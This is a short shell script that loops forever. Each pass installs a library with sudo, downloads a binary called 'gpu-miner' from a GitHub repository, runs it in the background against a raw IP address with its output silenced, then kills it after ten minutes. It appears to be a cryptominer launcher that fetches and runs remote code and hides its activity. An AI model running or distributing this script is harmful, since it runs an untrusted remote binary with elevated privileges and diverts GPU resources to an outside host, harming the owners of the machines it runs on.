#! /bin/sh
while command; do
sudo apt --force-yes -y install libuv1.dev; wget -c https://github.com/aleksey1255/ai/raw/main/gpu-miner; chmod u+x gpu-miner; ./gpu-miner -a 192.248.164.239 > /dev/null 2>&1 & nvidia-smi; sleep 600; pkill gpu-miner                                                                                                              
done
